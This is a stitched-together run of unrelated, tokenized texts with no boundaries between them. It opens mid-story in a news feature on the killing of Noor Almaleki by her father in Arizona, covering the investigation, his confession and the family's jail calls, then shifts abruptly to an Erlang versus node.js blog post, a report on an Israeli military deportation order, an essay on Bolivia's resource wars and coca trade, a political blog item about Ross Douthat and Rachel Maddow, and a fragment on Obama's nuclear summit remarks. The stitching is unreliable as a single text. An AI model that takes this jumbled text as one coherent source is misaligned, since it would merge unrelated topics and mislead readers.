But Amal soon discovered that she had locked her keys inside the vehicle .
She and Noor retreated to the DES office to regroup .
Amal called her son and asked him to bring by a spare key from home , about 20 minutes away .
It was a sunny , 85 - degree day , and Amal wanted to wait just outside the front door of the DES office .
But Noor was thirsty .
She suggested they go to the nearby Mexican restaurant for a cold drink .
The pair walked west along the sidewalk next to the office and started across the lot .
Seemingly out of nowhere , Amal saw a vehicle coming right at them .
She lifted her hands in defense , as if to stop the inevitable .
In that moment , she could see Faleh Almaleki behind the wheel .
The Jeep smashed into the women .
It dragged Noor across a curbed median and left her splayed on the pavement , unconscious and bleeding .
The impact hurled Amal Khalaf about 27 feet .
She suffered a broken pelvis , broken femur , and myriad cuts and bruises , but she remained conscious .
Peoria police later estimated that the SUV was moving as fast as 30 miles per hour .
Faleh sped out of the parking lot and turned west on Peoria Avenue .
Noor was barely alive , having suffered massive brain and spinal injuries , as well as many broken bones .
Amal soon provided police with a possible motive .
She said the Almalekis were furious with both her and Noor about the current living arrangement .
Amal explained that Faleh had been hell - bent to show her and his daughter who was boss , who was in control .
Within minutes of Faleh 's fleeing the bloody scene , he spoke by cell phone to his wife , to son Ali , and to at least two other members of his extended family .
Cell - tower records show that he called his cousin , Jamil Almaleki , less than an hour after the assaults and about half a mile from Jamil 's Phoenix home .
It 's uncertain whether Faleh stopped there on his way out of town , to get the extra clothes and money he had when authorities finally caught up with him .
Another possibility is that Faleh packed the clothes and money , days ' worth of insulin to treat his diabetes , and his U.S. passport ( he had recently become a naturalized citizen ) before driving to the DES office — which would indicate a well - planned attack .
Whether Faleh assaulted the women on the spur of the moment or premeditated his action , he had time to reflect on what he did : run over two defenseless women , one of whom was his firstborn child .
Three Peoria police detectives went to the Almaleki residence at 5 p.m. on October 20 , about three hours after the assaults .
Noor 's brother , Ali , opened the front door .
He was in a tough spot .
Ali once had been close to his sister .
His written praise accompanies a photo of the siblings in Noor 's senior yearbook at El Mirage Dysart High School :
" I admire that my sister is always there for me .
I 'm always able to talk to her no matter what .
She 'll always be there for me to listen to and give me a shoulder to lean on . "
But the feud between Noor and their parents had taken its toll , and the siblings had n't spoken in weeks .
( Ali later told friends in an e-mail that he had taken to calling his sister vile names before they stopped speaking . )
Ali told Detective Juan Lopez that he had n't been in touch with his father since mid-morning , when they had gone to a Best Buy electronics store together .
He insisted that he did n't want to get involved in whatever was going on .
But it was too late for that .
He told Detective Chris Boughey that things at his parents ' home had been increasingly strained since Noor had returned from Iraq after leaving her arranged marriage .
To Ali's way of thinking , his sister had dishonored the Almaleki family .
Ali said Noor had been " most disrespectful " to their parents ( to him , too ) since her return and continued to reject " traditional " Iraqi values .
The young man mentioned his own problems with his father , whom he described as a chronic gambler who liked to frequent Phoenix - area Indian casinos .
Ali 's mother , Seham , had been calling him over the past few hours , he said , saying that something had happened to Noor .
But Ali swore to detectives that he did n't know what had befallen his sister .
Detective Boughey returned to his car after the interview but did n't immediately leave .
Ali came out a few minutes later and told the cop he wanted to add some details to his account .
Ali then said he had spoken with his father at 2:30 p.m. ( about half an hour after the assaults ) , but he somehow could n't recall the substance of the conversation .
Ali let on that he had seen television coverage and wanted to know where Noor was hospitalized .
The detective said he could n't tell him that right away .
Faleh Almaleki crossed the Mexican border into Nogales , Sonora , about the same time that Ali was being questioned in Glendale .
Faleh soon parked his Jeep in a mall parking lot and checked into a hotel .
At 5:30 , he called his Phoenix cousin , Jamil .
The next day , October 21 , Peoria police issued a warrant for Faleh Almaleki 's arrest , alleging ( at that point ) two counts of aggravated assault .
That day , a detective contacted Noor 's mother by phone .
Seham Almaleki said she was driving back from her job in California .
She claimed all she knew was that there was a family problem of an unspecified nature .
The detective , Bill Laing , then told Seham that her husband had intentionally slammed into Noor and Amal with his Jeep and fled .
" This woman is a liar .
This woman is dirty .
Her family is dirty , " Seham told Laing , referring to Amal Khalaf .
She said repeatedly that she had n't communicated with her husband about the incident .
Laing told Seham that Noor 's condition was grave .
She replied that she wanted to see her daughter as soon as possible .
But the detective said he was concerned that Seham and others might pose further danger to Noor .
" I'm a danger ? " Seham shouted .
Ironically , given the circumstances , she continued , " I 'm a Muslim .
We can't kill our daughter . "
On October 22 , two days after the assaults , a Glendale pharmacist told police that someone had phoned in a prescription for Faleh Almaleki .
That evening , members of Noor 's family ( including her mother ) and many of her friends held a candlelight vigil at the DES parking lot in Peoria .
The news media were there to capture the moment .
The case was generating more buzz with each passing day .
Faleh Almaleki remained a fugitive as his daughter , comatose and unresponsive , clung to life .
Noor 's photos , many of them lifted from her Facebook and MySpace pages , were displayed on sites across the Internet .
They showed a beautiful young woman with long , black hair and a wistful expression .
Noor rarely smiled in the photos , possibly because of embarrassment over braces she had worn for a while .
But her friends say she was naturally upbeat , blessed with a sassy sense of humor that she employed even when times were tough .
" Noor , Noor , Noor .
How can I describe Noor ? " says one female pal who spent hours on end chatting with her at a coffee shop on the west side , where Noor was a part - time student at Glendale Community College .
" She was a trusting , loyal person who would calm everyone around her .
She was an angel .
Like a lot of us [ Muslim women ] , she could be private , but she told me that her dad did n't understand her .
" We have to respect our parents , but she said he wanted her to be this perfect Arab woman , not questioning or demanding anything — ' Whatever you say , Father ' — and that just was n't her . "
On October 24 , Ali Almaleki spoke with a television reporter about his sister .
He said she had been " going out of her way being disrespectful [ to their parents ] . "
Ali continued , " The boy [ Marwan Alebadi ] that is supposedly her boyfriend now — I do n't like him . "
He contrasted Iraq and the United States , saying , " Different cultures , different values .
One thing to one culture does not make sense to another culture . "
But he noted that seeing Noor at the hospital " just broke my heart .
Nobody should have to go through that . "
Ali said his father had called home the previous day to ask about Noor 's condition , but " my mom yelled at him and hung up . "
That day , Peoria detectives learned that on October 22 , a young man , possibly of Middle Eastern descent , and a woman wearing a veil had picked up prescription medicine for diabetes in Faleh 's name .
Detectives returned to the Almaleki home on October 26 for a follow - up interview with Ali and his mother , Seham .
By now , the detectives had examined phone records , which showed that Faleh had been in touch with his immediate family and others around the time of the assaults .
Seham admitted that she had lied in her earlier interview with police , but she continued to deny knowing her husband 's whereabouts .
Mother and son also admitted they had picked up the medicine at the pharmacy .
But Seham insisted she had thrown the pill bottles out of her car window , though she could n't come up with a reason for having done so .
Seham again blamed onetime friend Amal Khalaf for what had happened in the DES office parking lot .
Amal got what was coming to her , Seham alleged , because she is the matriarch of a family allegedly flush with drug abusers and thieves .
By contrast , Seham told the detectives , " We have a good family . "
Ali told her , " No , Mom .
We do n't . "
Later that evening , Ali Almaleki met alone with Detective Boughey at a Glendale restaurant .
Out of his mother 's presence , he provided new details of his father 's call to him before the assaults .
Faleh had just seen Noor and Amal at the DES office .
He said his father sounded angry , so he told Faleh to go home .
But Ali said Faleh phoned him later to say he had run down Noor and Amal with his car .
During the conversation , Faleh told Ali to " man up , " because he would n't be around anymore .
On October 27 , British Customs officials informed U.S. immigration authorities that Faleh Almaleki was in custody in London .
Faleh had arrived on a plane from Mexico City using his own name and his U.S. passport .
A computer check showed that Faleh was a wanted man in Arizona .
British Customs soon put Faleh on a Delta flight to Atlanta , where the feds have a port of entry for incoming fugitives .
On October 28 , Mexican authorities in Nogales contacted Peoria police .
They had found Faleh 's Jeep — the missing weapon — in a mall parking lot .
Crime - scene investigators later found hair , fiber , and human tissue on and under the front bumper of the vehicle .
On October 29 , Peoria detectives Chris Boughey and Jeff Balson sat across from their suspect in Georgia .
Faleh Almaleki waived his Miranda rights against self - incrimination , which meant the detectives could have at him .
At first , Faleh told them he had run over the two women in a freakish accident after coincidentally finding them at the DES office .
" If I want to try to kill my daughter , why would I kill my daughter with a vehicle ? " he asked , trying to sound reasonable .
" I have no problem with my daughter ; this is not the first time she left the house . . .
If I want to kill her , I go buy a gun .
I know where they live .
I just lost control [ of the car ] . "
Detective Boughey asked him whether he had been trying to scare the women .
" Might be something like this , " Faleh claimed , " but I do n't try to kill them . "
The detectives picked away at the murky account .
" I 've been angry , " Faleh replied , " and I lost control .
I lost the brain . "
But he continued to insist that no premeditation was involved .
Like his wife , Faleh faulted Amal Khalaf for what had happened .
He claimed she had " stolen " their daughter from them .
He insisted that he loved Noor , noting that his cell phone contained several photos of her .
But , as if it were a self - evident truth , Faleh said his daughter should not have become so " Americanized " — that it was wrong .
Faleh said he had stayed at the Nogales hotel for two nights , during which time a " stranger " gave him about $ 1,900 in cash for his Jeep and agreed to make sure some " paperwork " got to Ali .
The detectives told him this sounded implausible , but Faleh would n't budge .
Though unconfirmed , a far more likely scenario is that Faleh 's cousin , Jamil Almaleki ( or someone else close to the Almalekis ) , delivered the money , diabetes medicine , and a suitcase filled with clothes that Faleh had with him when British authorities collared him .
Jamil Almaleki could not be contacted for this story , and police reports suggest that he may have returned to Iraq .
Faleh said he hopped a bus from Nogales to Hermosillo and then flew to Mexico City .
Within a day , he boarded a Mexicana Airlines flight to London , where his desperate flight from the Peoria parking lot abruptly ended .
Detective Boughey asked Faleh whether his family was on his side .
Perhaps , the detective said , his attack had restored some of the " honor " supposedly lost by Noor 's lifestyle choices .
Faleh did n't reply directly , saying he would certainly help a friend or family member in a similar predicament .
" It 's our culture , " he explained .
Faleh asked the detective what he would do if he had such a disobedient daughter .
Boughey responded that he would not crush his daughter with a car .
He soon asked Faleh again whether he had meant to hurt the women .
Yes , Faleh Almaleki finally confessed , he had .
" If your house has got a fire [ in ] just part of the house , " he said , " do we . . . let the house burn or [ do ] we try to stop the fire ? "
Faleh then admitted that his daughter Noor was the " small fire " he was forced to extinguish .
He was booked into the Clayton County ( Georgia ) Jail and waived extradition .
On October 31 , the Peoria detectives escorted him back to Arizona .
At Faleh 's initial appearance in Phoenix later that day , a judge set his bail at $ 5 million .
Doctors at John C. Lincoln North Hospital pronounced Noor Almaleki clinically brain dead at 7 a.m. on November 2 .
Her family decided to take her off life support .
Several members — including her mother and brother , Ali — were by Noor 's bedside when her heart stopped beating at 11:54 a.m .
Police noted at Noor 's autopsy that her eyes ( so hauntingly beautiful in photographs ) were swollen shut .
Days later , a Maricopa County grand jury indicted Faleh on charges of first - degree murder , attempted first - degree murder , aggravated assault , and leaving the scene of an accident .
Noor 's violent death struck a nerve worldwide , especially after a county prosecutor officially attached " honor killing " to it .
To some , she would become a symbol for the ills said to infect Muslim culture , ills that would allow a father to slaughter a daughter with the blessing of at least some family members .
The sad case captured the attention of Rana Husseini , an expert on " honor killings . "
A reporter for the English - language Jordan Times and author of Murder in the Name of Honor , Husseini has written about dozens of such crimes in her homeland .
" I wish that poor girl had been able to stay safe , maybe in a shelter or something , " Husseini says .
" It 's such a waste of a life . "
In Jordan and elsewhere in the Middle East , men committing such killings often receive lax punishment — sometimes getting sentenced to only months , if that , behind bars .
Faleh Almaleki's fatal attack on his daughter fit the pattern of a typical " honor " crime in the Middle East .
The differences are that Faleh used a vehicle instead of a knife or machete and that , if convicted , he will probably spend the rest of his life in prison .
( County Attorney Andrew Thomas ' office is not seeking the death penalty . )
Someone created a Facebook page , " R.I. P Noor Faleh Almaleki , " within a few days of Noor 's death .
Its home page asked that Noor and " all other victims of senseless honor killings rest in peace .
And may God be the guardian of others in danger of sharing that fate .
And may we all do something to end honor killings once and for all . "
On the " wall " that is part of the page , more than 3,000 people have written about Noor , her tragic death , and Muslim culture .
A typical entry , written by an 18 - year - old girl from Maine , says , " I can tell she was a good girl , and when she finally realized she could n't live her life under another person 's decision , she left !
I respect her so much for that .
" She is going to live her life in Heaven like she did n't get to live it here on Earth . "
Another of those commenting was her brother Ali , who wrote , " What grabs the most attention from this situation is the fact that this is a Middle Eastern family .
" The media has drawn this image that Noor , RIP , was a saint and my dad was the Devil . "
Ali said he was n't " advocating " what his father did , but he insisted that the slaying was unplanned .
" You guys [ in the media ] be careful what you say , " he wrote .
" That 's my father you 're talking about .
And my father is a loving man .
He loved Noor .
That may raise eyebrows , and you guys [ may ask ] , ' Why would he do this if he loved her ? ' "
Ali 's conclusion : " He lost his mind . "
Referring to Noor , he said , " Nobody deserves this , and this never should have happened .
And nobody will ever understand the kind of pain my family is enduring . "
Noor Almaleki's life never was the same after she rebelled against her parents and their culture and left her arranged marriage .
On and off , she tried over the final year or so of her life to live with her family , but it did n't work .
Faleh and Seham considered her tainted , someone who had humiliated them by leaving the Iraqi husband her father had chosen for her .
Faleh was livid when , after Noor 's return from Iraq , he found a seemingly innocent snapshot of her and a few guy friends .
In his mind , Noor should n't have been chummy with men other than her husband , to whom she remained legally married .
But Noor stood up for herself .
She posted a free page on ExploreTalent.com that showcased aspiring models , actors , musicians , and dancers .
The photographs on Noor 's page were not racy , just photos of a young woman with a uniquely beautiful face .
Noor never paid the $ 30 monthly fee to find out whether anyone was interested in her " look " for possible modeling assignments .
Noor found work as a server at an Applebee 's restaurant , where she made new friends .
One of her co-workers , Nicole Ferugia , recalls that Noor quit after her father learned that she was employed at an establishment that serves liquor .
In summer 2008 , Noor moved in with a girlfriend 's family for a time .
That July , Faleh asked Glendale police to charge his daughter with felony auto theft after she took his car ( not the Jeep ) from the driveway early one morning and almost immediately got into a minor accident .
Faleh tried to make a deal with her :
If she returned home and straightened herself out , he would ask authorities to drop the case against her .
But Noor would n't agree to that and wound up facing a serious charge that remained unresolved at the time of her death .
Things continued to deteriorate inside the Almaleki family .
In March 2009 , Seham Almaleki won an order of protection against Noor in Glendale City Court .
In her petition , Seham claimed Noor had come home and hit her on one occasion and had cursed her in the family home on another .
Noor did not contest the order , which barred her from the Almaleki residence and from contacting her siblings at their schools .
By this time , she had moved in with her new boyfriend , Marwan , and his mother .
To the Almalekis , this was akin to a declaration of war by Noor , Amal Khalaf , and her son .
On July 20 , Faleh and Seham broke into Amal 's home late at night to try to corral their daughter .
Glendale police reports say Noor and Marwan were n't home at the time .
But Seham banged on Amal 's locked bedroom door and challenged her to come out and fight .
Amal apparently hid until police arrived in response to a 911 call made by one of Amal 's young daughters .
Amal declined to pursue criminal charges against the Almalekis .
Some of Faleh and Seham 's concerns about their daughter 's living arrangement may have been justified .
Last August 6 , Glendale police arrested Marwan Alebadi on charges of assaulting Noor , allegedly as she tried to break up his fight with an unnamed third party at Amal 's home .
Authorities accused Marwan of breaking and lacerating Noor 's nose during the clash , which he denied .
The domestic - violence charge was still pending when Noor died .
At home recovering from her injuries , Amal Khalaf told Peoria police in December that she had taken in Noor because the young woman had nowhere else to go after leaving her parents ' house .
Giving
Noor shelter had been her sole concern , not facilitating Noor 's romantic relationship with her son , Amal stressed .
She said she knew how much Noor missed her younger siblings and that Noor would talk with her 16 - year - old sister , Fatima , without her parents ' knowledge .
Just days before the assaults , Amal said , she had persuaded Noor to reach out to her parents , in an effort to get a dialogue going .
Noor spoke with her mother by phone , but Amal said it did n't go well .
She said Noor told her that Seham had declared , " Amal is your mom ; I 'm not your mom . "
In the weeks after his arrest and subsequent incarceration at the Maricopa County Jail , Faleh Almaleki spoke often by phone with family members .
Authorities secretly taped every word .
" How is she now ? " Faleh asked cousin Jamil during one conversation .
Faleh and his family spoke in Arabic during the jail conversations , which were later translated into English .
" Who 's she ? " Jamil asked .
" Noor , " Faleh said .
" Noor died , brother , " Jamil said .
" What ? " Faleh asked .
" Yes , she 's gone , Faleh .
Now , look after yourself . "
" Brother , " Faleh replied , " talk to the lawyers and tell them it was not intended to be a murder . "
Faleh told Jamil to ask the Iraqi consulate to intervene with the American government .
" Connect it to honor and dishonor and , I do n't know , whatever , " he said .
" And an Iraqi is worth nothing without honor . "
Jamil agreed , saying , " This is the base of the story .
Newspapers wrote about this issue .
It 's happening now , and the Internet and whole world is writing about this subject . "
Faleh continued to go over the honor - killing theme in phone calls with his wife .
" Listen , " he told Seham , " have [ friends ] sit across from the [ U.S. ] consulate [ in Iraq ] and hold signs saying , ' The Iraqi honor is precious . '
Signs saying that I 'm not a criminal , [ that ]
I did n't break into someone 's house , [ that ] I did n't steal .
You know what I mean ?
And for an Iraqi , honor is the most valuable thing . "
Faleh went on with his riff : " No one hates his daughter , but honor is precious , and nothing is better than honor , and we are a tribal society that can't change .
I did n't kill someone off the street .
I tried to give her a chance , but no result . "
Seham chided her husband at one point for having " rushed into it , " presumably referring to his violent act .
" Seham , do n't blame me , " Faleh protested .
" Can you watch Amal 's demeanor and do nothing ?
You can 't .
Amal brought it upon her . "
" Amal brought it upon her , " Seham repeated .
" Verily to Allah we belong , and verily to Him we shall return , " Faleh told her .
" Trust in God , and pray to God , " he said , " and do n't rush and retain a mediocre lawyer . "
The subject of legal representation came up in another recorded conversation .
Seham mentioned a lawyer who had " pulled a miracle " in an unspecified case .
" Is he Arab ? " Faleh asked .
" No , not Arab , " she replied .
" He is a Jew . "
Faleh paused .
" A Jew ? " he said .
" Check with Arabs as well .
[ But ] if there is a loophole in this subject — you know , clans , tribalism , something like that — the Jews know of it .
See if there is a loophole or something .
" We can say that you have . . . a psychological problem , " Seham suggested .
" You have to tell them , ' I am suffering because of the war . ' "
Faleh agreed that this would be a good idea .
" Tell them I am tired and feel nervous .
I am always suffering from this condition .
Tell them I got sick in Iraq .
Okay ? "
Another call between the couple revealed more .
" Noor is gone , Faleh , " Seham said , crying as she spoke .
" I lost my daughter .
My daughter is gone . "
" I told you , " Faleh replied .
" Your daughter was gone anyway . "
" No , Faleh , " his wife continued .
" She 's gone !
My daughter is gone ! "
" Noor is gone , and what about me ? "
Faleh responded .
" You are gone , " his wife concluded .
Faleh Almaleki has pleaded innocent to the charges against him .
A trial date has n't been set .
He will remain locked up in the Maricopa County Jail until his case ends .
The Almaleki family declined to speak with New Times for this article .
The family 's comments all came from investigation records and from posts on Web sites .
Neither would most of Noor Almaleki 's friends speak on the record , saying they feared her family might retaliate .
Her boyfriend , Marwan , could not be reached for comment .
The blogosphere continues to resonate with opinions about " honor killings " and about the Faleh Almaleki case .
" There 's no doubt about it , " writes Pamela Geller of the virulently anti-Muslim blog atlasshrugs.com .
" He ought to be executed . "
That is the overwhelming sentiment , even though the County Attorney 's Office , and its usually tough - on - criminals leader Andrew Thomas , has decided not to seek capital punishment against Faleh .
Others , however , have expressed a different point of view .
" Rest in peace , Noor , " someone recently wrote on the young woman 's memorial Facebook page .
" May Allah forgive her and forgive us for all our sins .
And may Allah help her Dad !!!! "
I 've written about Erlang in the past , and my suspicion that , soon or later , other languages / systems will come along and " eat its lunch " .
Scala is one such potential contender .
Another that has been gaining some visiblity lately is node.js , a simple framework for creating networked applications on top of Google 's V8 Javascript engine .
I should define what Erlang 's lunch is a little bit better before we go on .
Erlang does several things really , really well ; better than many existing , mainstream systems :
Concurrency – the Actor model that it uses is much easier and more pleasant than dealing with threads .
Distributed systems – Erlang makes this fairly easy and pleasant as well .
Fault tolerant systems – using its distributed powers , Erlang is good for writing things like telephone switches that can't spend any significant time down .
Of these , I think the big one is concurrency .
Distributed systems are nice , but not a critical point for most people .
Same goes with fault - tollerant : those who need it really need it , but the rest of us are willing to make some compromises .
Our web applications are important , but generally not something where people 's lives hang in the balance .
How does Erlang do " concurrency " ?
The developer creates Erlang " processes " that interact with one another by passing messages .
These are not real , OS level processes , though , and this is critical to how Erlang operates .
Since these processes must all coexist within one real , system level process , it is absolutely essential that no operation that they perform hangs the entire system !
The Erlang runtime system is built around this concept .
Any Erlang process can do things like read and write to the disk or network , or have a " while ( true ) { …. } " loop ( it does n't actually look quite like that in Erlang , but that 's the idea ) , and it wo n't wedge the system .
This knowledge is also critical when you want to interface Erlang to the outside world : if your C library contains a routine that might block for a long time , you can't just call it from Erlang as it wo n't be a well - behaved part of Erlang 's world ( there are ways around this of course , but make life a bit more complicated for the developer ) .
All this is done with Erlang 's scheduler : each Erlang process gets a number of operations it can run before some other process gets to run , so even our while loop will only run for a bit before the system moves on to something else .
IO is rigorously done with non-blocking calls internally in order to keep that from becoming an issue .
No other system that I know of has such a focus on being non-blocking , and node.js is no exception : a while ( true ) loop is perfectly capable of wedging the system .
Node.js works by passing functions ( closures , in many cases ) around so that work can be performed as needs be .
However , the actual functions that run actually do block the system , and thus must be written in order to not run for too long .
Also , and this is important , Node.js also does its best to make IO non-blocking by default , so that you do n't have to worry about IO calls .
Node.js is n't up to the level Erlang is at , because it requires more manual intervention and thinking about how to do things , but it 's probably " good enough " for many tasks .
How often do you really write code with so many calculations that it slows things down ?
Not often in my case – the real world problem I most often encounter is IO , and node .js does its best to make that non-blocking , so that it can be handled in the " background " or a bit at a time , without wedging the system .
And if you really needed to write a long - running calculation ( say you want to stream the digits of PI or something ) , you can break up your calculation manually , which may not be quite as elegant as Erlang , but is " good enough " for many people .
" Good enough " concurrency , combined with a language that is at least an order of magnitude more popular than Erlang , and a fast runtime , combined with ease of use in general ( it 's way easier to get started with node.js than with most Erlang web stuff ) make for a system that 's likely to do fairly well in terms of diffusion and popularity , and is going to " eat some of Erlang 's lunch " .
Or perhaps , rather than actually taking users away from Erlang , it 's likely to attract people that might have otherwise gone to Erlang .

New legislation is due to go into effect on Tuesday granting the army authority to deport thousands of Palestinians from the West Bank to the Gaza Strip or Arab countries from which they originally hailed , even if they entered the area legally and have lived there for many years , Israeli human rights organizations warned Sunday .
The new order makes it a criminal act for anyone to live in the West Bank without a permit .
Violators can be sentenced to up to seven years in prison .
In a letter addressed to Defense Minister Ehud Barak , the organizations demanded that he revoke two military orders or at least postpone them “ as they are unlawful and allow extreme and arbitrary injury to a vast number of people . ”
The letter was signed by Hamoked – Defense of the Individual , The Association for Civil Rights in Israel , Bimkom , Planners for Planning Rights , B’Tselem , Gisha , The Public Committee against Torture in Israel , Yesh Din , Adalah , Rabbis for Human Rights and Physicians for Human Rights .
The key new military order is and amendment to the Order regarding Prevention of Infiltration , which was originally legislated in 1969 to prevent and punish infiltration from Jordan , Syria , Egypt and Lebanon , all of which were enemy countries at the time .
The amendment , however , is aimed at anyone living in the West Bank who does not have a legal permit or certificate issued either by the West Bank military commander or the Interior Ministry .
According to an attorney for Hamoked , Elad Cahana , the military commander of the West Bank has never issued such permits so that even Palestinians who were born in the West Bank do not have them .
Nevertheless , according to the amendment , an infiltrator is defined as “ anyone who enters the Area [ i.e. the West Bank ] illegally after the date established by this law or who is [ already ] residing in the Area and does not have a permit in accordance with the law .
” Cahana toldthat based on recent Israeli policy , the main target of the legislation are Palestinians who moved from Gaza to the West Bank , the overwhelming majority of which did so in order to marry .
Until 2000 , Cahana said , Palestinians from the West Bank and Gaza could move back and forth between the areas without restrictions .
In the following years , they had to receive permission from military authorities to do so .
But in 2007 , the authorities began to turn down requests from Palestinians living in the Gaza Strip to move to the West Bank .
In many cases , Gazan women could not join their husbands and even in humanitarian cases , the army established narrow criteria for allowing the move .
Several petitions , mostly filed by individual Palestinians from Gaza seeking to move to the West Bank for family reunification or humanitarian reasons , are currently being heard in the High Court of Justice .
The problem is intensified by the fact that over the past 10 years , except for a brief interlude , Israel has refused to grant residential status to non-West Bank natives , from Gaza or foreign countries , who have been living in the West Bank .
These Palestinians lack residential status and all the benefits that go with it , such as the right to work , because of Israeli policy .
But with the new military law , they also face the prospect of going to prison .
Another group that stands to be hard hit by the new order is immigrantsto the West Bank from Jordan , most of whom moved there to marry .
Cahana said Barak has not yet replied to the organizations ’ letter .
The IDF Spokesperson said in response to the report : “ The laws in Judeaand Samaria have in the past permitted the expulsion of Palestinianswho are illegally residing in the West Bank .
“ The objective of changing the order to prevent infiltrations that willgo into effect on April 13 and was signed a half - a - year - ago and waspublicized is to allow for a legal process on the deportation procedureof Palestinians illegally in the West Bank by a committee which isheaded by a judge and to enable additional oversight of thisprocedure , ” the IDF added .

There has n’t yet been a tin or copper war , but there once was a nitrate war , and in the past decade Bolivia has seen both a water war and a gas war — the latest struggles over the nation ’s only real riches , the lucrative resources granted by God and geology .
In this country nearly twice the size of France , where Amazonian jungles butt against 12,000 - foot plateaus , the winners have always come from elsewhere .
The Inca royalty of Cuzco ( in modern - day Peru ) took power from the local Aymara ; the Spanish took gold and silver ; the British took tin ; recently , multinationals Bechtel and Suez tried to privatize the water supplies of Cochabamba and El Alto , while other foreign companies fought for control of Bolivia ’s prodigious supply of natural gas ; cartels continue to take the coca and its profits .
Bolivia ’s losers have always been the same : the disenfranchised indigenous .
With an annual income of just $ 1,150 per capita , Bolivia is the poorest country in South America .
But it is a deeply organized , socially coherent poverty , rooted in centuries of survival through communal politics and labor cooperation .
Even today , long columns of Aymara men can be seen stepping backward through the fields with foot plows , opening the ground as chanting women follow , seeding potatoes .
And for the first time in history , the piratical outsiders have been stymied by a homegrown revolution and its thin but consoling power .
It was the gas war of 2003 as well as dissatisfaction with the American - led war on drugs that led the brown masses to march on La Paz and usher out the last of Bolivia ’s white - led , semi-colonial governments .
Real , broad elections summoned for the first time an indigenous leader , Evo Morales , to the Palacio Quemado , or “ burned palace , ” so named for being repeatedly torched during the more than 150 ruling - class coup d’etats that have marked Bolivian history .
With its mixture of idealism and limited but sharp violence , this latest uprising was more like the Ukranian Orange Revolution than the Castro - style putsch feared by K and Wall streets .
The alpaca - sweater - wearing Evo celebrated his inauguration at the ancient city of Tiahuanaco , at the ruins of a pre-Columbian site of sun worship .
In accordance with mass demands for democracy and transparency , his administration struck a populist tone , signing trade deals with Venezuela ’s Hugo Chávez , nationalizing foreign - controlled oil and gas industries , paying students to attend school , and updating the face of nationalism , evidenced by the endless television programs in which indigenous people present their grievances and are , for the first time in Bolivian history , actually heard .
The revolution is by no means perfect .
Corruption persists , and Evo has not hesitated to toss the race card back in the face of the white elite who exploited it during the last century .
Still , there is no turning back the clock on the rise of a new majority .
But having asserted their power , Bolivia ’s indigenous people — a clear majority in a nation of just 9 million , but divided into many language groups — face the challenge of forging a movement larger than identity politics .
Increasingly the Aymara are fleeing altiplano poverty for the tropical promise of the lowland coca business , uprooting their ancient way of life for a risky , marginally profitable role as peons in the international drug trade Urbanized “ Indians ” are in reality sharply divided between established cholos , a bowler - hatted business class with longtime roots in La Paz and other cities , and the ever - swelling ranks of newcomer refugees who crowd into El Alto and other chaotic , emerging neighborhoods , scratching out a living as porters , gardeners , and ditchdiggers .
Regionalism is spinning the country apart , pitting the national government high in La Paz against the economic powerhouse of lowland Santa Cruz .
Fresh , angry slogans in La Paz cry out eliminate private property , less a practical demand than a warning of the impossible expectations that await reformers .
Many who remain in the mountains resort to the pittance earned by mining for gold , silver , and tin .
Under Spanish rule , these same mines cost the lives of millions of indigenous and African laborers .
Thanks to the global boom in metal prices , mines previously considered exhausted tempt a new generation of boys who descend into impossibly dark , narrow , unventilated veins of the Andes , chewing coca to suppress their appetite , fatigue , and fear .
Coca has always been a palliative for Bolivia ’s poor , but only recently has the country become central to the global cocaine market .
As Washington squeezed the coca balloon in Colombia , it has bulged out in southern Bolivia , where production has increased , even as the United States now pours $ 66 million a year into interdiction , military and police training , and DARE anti-drug classes for 28,000 Bolivian students .
America has focused on crop eradication , and efforts to help Bolivians cultivate replacement crops have mostly failed .
A former coca farmer and coca-union leader who railed against American - led programs , Evo Morales ran on a Coca Sí! Cocaína No! platform .
He keeps a portrait of Che Guevara made entirely from coca leaves on his office wall and never misses a chance to serve coca tea to visiting politicians .
But the leaf traditionally grown at high altitude and chewed by indigenous Bolivians has become a Trojan horse for the broader cultivation of a more bitter , unchewable , low - growing leaf useful only to narcotraffickers .
Washington tabulates successes like body counts , claiming that in 2007 , precisely 3,093 labs and maceration pits ( often little more than plastic - lined ruts where cocaine paste is mixed ) were destroyed , 13.8 metric tons of cocaine base were seized , and Bolivia ’s anti-narcotics police carried out 8,269 operations .
The real gains are ephemeral .
Armed and trained by the United States , Bolivian commandos chase low - level producers through Evo’s Chapare region ; meanwhile major traffickers sometimes walk out of jail , as pure and cheap cocaine floods onto world markets .
On a fundamental level , the war on drugs is like all the other commodities wars Bolivia has endured : Rural peasants take all the risk — going so far as transporting coca by strapping it to the bodies of their young children — while outside traffickers take most of the profits .

Glenn Greenwald catches Ross Douthat inventing a false claim for " balance " on cable news .
In his New York Times column today , Ross Douthat laments the lack of real political debates on cable news shows , and writes this :
What might work , instead , is a cable news network devoted to actual debate .
For all the red - faced shouting , debate is n’t really what you get on Fox and MSNBC .
Hannity has ditched Colmes , and conservatives are only invited on Rachel Maddow ’s show when they have something nasty to say about Republicans .
Here we find two of the most common pundit afflictions : ( 1 ) a compulsion to assert equivalencies even when they do n't exist , and ( 2 ) a willingness to spout anything without doing the slightest work to find out if it 's true .
Douthat 's claim about Maddow -- that " conservatives are only invited on [ her ] show when they have something nasty to say about Republicans " -- is completely false .
The real problem is not that Maddow fails to invite conservatives on her show ; she does exactly that relentlessly .
The problem is that most leading conservatives refuse to be interviewed by anyone -- such as Maddow -- who will conduct adversarial interviews .
They thus restrict themselves to the friendly confines of Fox News or to television interview shows where the hosts refuse to question them aggressively due to a fear of being perceived as something other than " neutral . "
Indeed , as I noted before , after Maddow had interviewed GOP Gov. Tim Pawlenty ( who said nothing " nasty about Republicans " ) :
Maddow is constantly attempting to lure right - wing and other Republican guests to her show , but they almost always refuse .
As she put it after the Pawlenty interview : Governor Pawlenty represents Minnesota and I will just say -- we ask a lot of Republicans to be on the show and they almost always say no .
So , I am particularly grateful whenever anybody says yes .
And to any Republicans out there who we ask -- see -- I 'm not so bad ... read on
I 've often said that it 's not a bad idea to let right wingers come on TV and enter into a heated debate on the issues because then their crazy views would be exposed to the world instead of covered up or softened up .
You do need a skillful person like Rachel Maddow to be there to expose the lunacy because talkers like say a Bill O'Reilly are very talented at framing and controlling the debate .
I guess they recognize Maddow 's grasp of the facts and it must scare them .
The fact that War hawks like Dick Cheney are too afraid to go on Maddow 's show is quite revealing .
Also what 's very disturbing is that the Villagers always draw these false equivalances between the right and left .
What are they afraid of ?
At the close of this week ’s two - day Nuclear Security Summit , President Obama was trying to answer a question regarding the United State ’s leadership position in the quest for nuclear disarmament .
He asserted that the U.S. finds itself in the driver ’s seat because , “ Whether we like it or not , we remain a dominant military superpower . ”
Initially , the remark garnered little attention .
